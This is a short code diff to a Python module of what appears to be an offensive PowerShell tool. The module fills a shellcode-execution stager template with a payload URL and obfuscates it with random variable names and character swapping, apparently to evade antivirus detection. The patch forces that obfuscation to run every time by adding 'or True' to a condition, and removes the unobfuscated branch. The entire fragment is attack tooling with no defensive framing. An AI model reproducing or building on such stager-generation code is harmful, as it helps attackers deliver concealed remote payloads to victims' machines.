@@ -20,12 +20,10 @@ class PsModule(ModuleObject):
         
     def run_action(self):
         stage1 = ""
-        if self.vars["rand"][0].lower() == "true":
+        if self.vars["rand"][0].lower() == "true" or True:
             stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
             for i in reversed(range(1, 12)):
                 stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(5, 25)))
-        else:
-            stage1 = self.load_file("core/util/exec-sc-rand.ps1").replace("[URL]", self.vars["url"][0])
 			
         path = self.write_file(stage1)
         stage1 = self.read_file(path).replace("A", "!")
